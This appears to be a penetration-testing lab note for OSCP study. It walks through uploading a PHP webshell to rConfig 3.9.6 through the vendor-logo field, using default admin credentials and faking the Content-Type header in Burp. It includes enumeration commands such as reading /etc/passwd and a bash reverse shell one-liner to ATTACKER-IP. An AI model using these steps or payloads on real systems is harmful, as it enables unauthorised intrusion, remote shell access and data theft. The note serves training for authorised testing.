# PHP Webshell Upload (File Type Bypass via Burp)

## Overview

PHP executes code **server-side**, allowing us to upload a PHP script which:

- executes OS commands
- provides web-based shell access
- launches reverse shells
- enables file upload/download
- assists enumeration

Common scenario:

web application restricts file upload types to images:

```
.png
.jpg
.gif
```

We bypass validation by modifying HTTP request metadata with **Burp Suite**.

---

# Lab Example

Target:

```
rConfig 3.9.6
```

Default credentials:

```
admin : admin
```

Upload location:

```
Devices → Vendors → Add Vendor
```

Upload field:

```
Vendor Logo
```

---

# 1. Obtain PHP Webshell

Example source:

WhiteWinterWolf PHP webshell

Create file:

```bash
nano connect.php
```

Paste PHP shell code.

---

# 2. Configure Burp Proxy

Set browser proxy:

```
IP: 127.0.0.1
Port: 8080
```

Burp → Proxy → Intercept → ON

All HTTP requests now routed through Burp.

---

# 3. Attempt File Upload

Upload:

```
connect.php
```

Upload will fail due to file type filtering.

Intercept request in Burp.

---

# 4. Modify Content-Type Header

Locate POST request:

```http
POST /vendors.php HTTP/1.1
Content-Type: multipart/form-data
```

File section example:

```http
Content-Disposition: form-data; name="vendor_logo"; filename="connect.php"
Content-Type: application/x-php
```

Modify header:

```http
Content-Type: image/gif
```

OR:

```http
Content-Type: image/png
```

Purpose:

trick server validation logic.

---

# 5. Forward Request

Click:

```
Forward
Forward
```

until request completes.

Disable interception.

---

# 6. Locate Uploaded File

Application stores vendor logos in:

```
/images/vendor/
```

Navigate to:

```
http://target/images/vendor/connect.php
```

---

# 7. Execute Commands via Webshell

Example commands:

```bash
whoami
id
hostname
uname -a
pwd
ls
```

---

# Example Output

```bash
www-data
uid=33(www-data) gid=33(www-data)
Linux rconfig 5.4.0-81-generic
```

---

# Webshell Characteristics

Webshells are typically:

- non-interactive
- limited command chaining
- unstable
- logged by web server

Limitations:

```
whoami && hostname
```

may fail depending on shell implementation.

---

# Common Issues

## File removed automatically

Web apps may:

- delete unknown file types
- remove inactive uploads
- overwrite filenames

---

## Limited command execution

May lack:

- tab completion
- job control
- piping support
- stable TTY

---

## Upload directory restrictions

Possible protections:

- execution disabled
- renamed file
- moved to random directory
- stored outside webroot

---

# Post-Exploitation Best Practice

After confirming command execution:

attempt reverse shell:

```bash
bash -i >& /dev/tcp/ATTACKER-IP/443 0>&1
```

Then remove webshell if engagement scope requires stealth.

---

# Evidence Collection for Reporting

Record:

- upload endpoint
- payload filename
- payload hash
- upload directory
- execution URL
- commands executed

Example:

```bash
sha1sum connect.php
md5sum connect.php
```

---

# Full Attack Workflow

1. identify file upload functionality
2. obtain PHP webshell
3. configure Burp proxy
4. intercept upload request
5. modify Content-Type header
6. upload file successfully
7. locate uploaded file
8. execute commands
9. upgrade shell if possible
10. document artefacts

---

# Quick Commands Cheat Sheet

## start burp proxy

browser proxy:

```
127.0.0.1:8080
```

---

## upload php shell

```
connect.php
```

---

## modify request header

```http
Content-Type: image/gif
```

---

## access shell

```
http://target/images/vendor/connect.php
```

---

## enumerate host

```bash
whoami
id
hostname
pwd
ls
uname -a
cat /etc/passwd
```

---

# Related Notes

- file upload bypass
- burp repeater
- webshells
- reverse shells
- rce exploitation
- apache misconfiguration

---

# Tags

#webshell #php #burp #file-upload #rce #oscp #enumeration